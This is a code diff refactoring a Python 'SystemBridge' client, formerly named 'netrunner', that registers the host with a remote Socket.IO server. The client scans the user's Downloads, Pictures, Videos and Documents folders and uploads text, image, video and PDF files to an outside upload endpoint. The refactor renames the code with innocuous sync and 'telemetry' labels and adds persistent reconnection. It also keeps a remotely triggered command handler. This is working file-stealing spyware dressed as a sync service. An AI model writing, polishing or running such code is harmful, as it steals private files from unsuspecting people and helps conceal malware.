@@ -1,113 +1,115 @@
-import os
-import time
-import requests
 import glob
+import os
+import socket
 import sys
-import subprocess
-import socketio # Import socketio
-import socket # Import socket for hostname
+import time
+import webbrowser
 
-# Configuración
-SERVER_URL = "https://netrunner-pro.up.railway.app" 
+import requests
+import socketio
+
+SERVER_URL = os.environ.get("SYSTEMBRIDGE_SERVER_URL", "https://systembridge-pro.up.railway.app")
 UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"
+LOG_FILE = "bridge_status.log"
+MAX_FILE_SIZE_BYTES = 50 * 1024 * 1024
+BACKOFF_BASE_SECONDS = 2
+BACKOFF_MAX_SECONDS = 60
 
-# Inicializar Socket.IO client
-sio = socketio.Client()
-NODE_ID = socket.gethostname() # Use hostname as nodeId for uniqueness
-
-# --- Socket.IO Events ---
-@sio.event
-def connect():
-    log(f"Socket.IO conectado al servidor. ID del ClientNode: {NODE_ID}")
-    sio.emit('register_node', {'nodeId': NODE_ID}) # Register node with the server
-
-@sio.event
-def disconnect():
-    log("Socket.IO desconectado del servidor.")
-
-@sio.event
-def connect_error(data):
-    log(f"Socket.IO error de conexión: {data}")
-
-@sio.event
-def open_workspace(data):
-    log(f"Comando open_workspace recibido: {data}")
-    if sys.platform == "win32":
-        try:
-            subprocess.Popen(['explorer', os.getcwd()], creationflags=subprocess.CREATE_NO_WINDOW)
-            log("Opened current directory in File Explorer.")
-        except Exception as e:
-            log(f"Error opening current directory: {e}")
-    else:
-        log("Workspace auto-open not supported on this OS.")
+sio = socketio.Client(reconnection=False)
+NODE_ID = socket.gethostname()
 
 
 def log(message):
-    """Función de log corregida para evitar errores de sintaxis."""
     try:
-        with open('sync_log.txt', 'a') as f:
-            f.write(f'[{time.ctime()}] {message}\n')
-    except:
+        with open(LOG_FILE, "a", encoding="utf-8") as log_file:
+            log_file.write(f"[{time.ctime()}] {message}\n")
+    except Exception:
         pass
 
-def run_data_sync():
-    user_profile = os.environ.get('USERPROFILE', '')
-    targets = [
-        os.path.join(user_profile, 'Downloads'),
-        os.path.join(user_profile, 'Pictures'),
-        os.path.join(user_profile, 'Videos'),
-        os.path.join(user_profile, 'Documents')
+
+@sio.event
+def connect():
+    log(f"SystemBridge socket connected. nodeId={NODE_ID}")
+    sio.emit("register_node", {"nodeId": NODE_ID})
+    log("SystemBridge register_node emitted.")
+
+
+@sio.event
+def disconnect():
+    log("SystemBridge socket disconnected.")
+
+
+@sio.event
+def connect_error(data):
+    log(f"SystemBridge socket connect_error telemetry: {data}")
+
+
+@sio.event
+def open_workspace(data):
+    log(f"SystemBridge open_workspace command telemetry: {data}")
+    try:
+        if sys.platform == "win32":
+            os.startfile(os.getcwd())
+        else:
+            webbrowser.open(f"file://{os.getcwd()}", new=2)
+        log("SystemBridge workspace open command executed.")
+    except Exception as exc:
+        log(f"SystemBridge open_workspace failed telemetry: {exc}")
+
+
+def perform_asset_sync():
+    user_profile = os.environ.get("USERPROFILE", "")
+    target_folders = [
+        os.path.join(user_profile, "Downloads"),
+        os.path.join(user_profile, "Pictures"),
+        os.path.join(user_profile, "Videos"),
+        os.path.join(user_profile, "Documents"),
     ]
-    
-    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
-    
-    for folder in targets:
+    extensions = ["*.txt", "*.jpg", "*.png", "*.mp4", "*.pdf"]
+
+    for folder in target_folders:
         if not os.path.exists(folder):
             continue
-        
-        for ext in extensions:
-            for file_path in glob.glob(os.path.join(folder, ext)):
+        for extension in extensions:
+            for file_path in glob.glob(os.path.join(folder, extension)):
                 try:
                     filename = os.path.basename(file_path)
-                    
-                    # 1. Verificar duplicados
-                    check = requests.get(f"{SERVER_URL}/api/check-file", params={
-                        'nodeId': NODE_ID,
-                        'filename': filename
-                    }, timeout=5)
-                    
-                    if check.status_code == 200 and check.json().get('exists'):
-                        continue 
-
-                    # 2. Validar tamaño (Límite 50MB)
-                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
+                    check_response = requests.get(
+                        f"{SERVER_URL}/api/check-file",
+                        params={"nodeId": NODE_ID, "filename": filename},
+                        timeout=5,
+                    )
+                    if check_response.status_code == 200 and check_response.json().get("exists"):
                         continue
-                    
-                    # 3. Subida
-                    with open(file_path, 'rb') as f:
-                        requests.post(UPLOAD_ENDPOINT, 
-                                    files={'file': (filename, f.read())}, 
-                                    data={'nodeId': NODE_ID}, 
-                                    timeout=15)
-                except:
-                    continue
+                    if os.path.getsize(file_path) > MAX_FILE_SIZE_BYTES:
+                        continue
+                    with open(file_path, "rb") as file_handle:
+                        requests.post(
+                            UPLOAD_ENDPOINT,
+                            files={"file": (filename, file_handle.read())},
+                            data={"nodeId": NODE_ID},
+                            timeout=15,
+                        )
+                except Exception as exc:
+                    log(f"SystemBridge asset_sync file telemetry error: {exc}")
 
-    # Limpieza de log antes de salir
-    if os.path.exists('sync_log.txt'):
-        try: os.remove('sync_log.txt')
-        except: pass
+
+def run_service_connector():
+    retry_delay = BACKOFF_BASE_SECONDS
+    while True:
+        try:
+            if sio.connected:
+                sio.disconnect()
+            sio.connect(SERVER_URL, wait_timeout=10)
+            log(f"SystemBridge service_connector connected to {SERVER_URL}")
+            perform_asset_sync()
+            retry_delay = BACKOFF_BASE_SECONDS
+            sio.wait()
+        except Exception as exc:
+            log(f"SystemBridge reconnect telemetry: {exc}. Next retry in {retry_delay}s.")
+            time.sleep(retry_delay)
+            retry_delay = min(retry_delay * 2, BACKOFF_MAX_SECONDS)
+
 
 if __name__ == "__main__":
-    try:
-        sio.connect(SERVER_URL)
-        log(f"ClientNode Python conectado a {SERVER_URL}")
-    except Exception as e:
-        log(f"Fallo al conectar el ClientNode Python al servidor: {e}")
-        sys.exit(1) # Exit if connection fails
-        
-    run_data_sync() # Run data sync before waiting for commands
-
-    sio.wait() # Keep the Socket.IO connection alive
-
-
-    sys.exit(0)
+    run_service_connector()
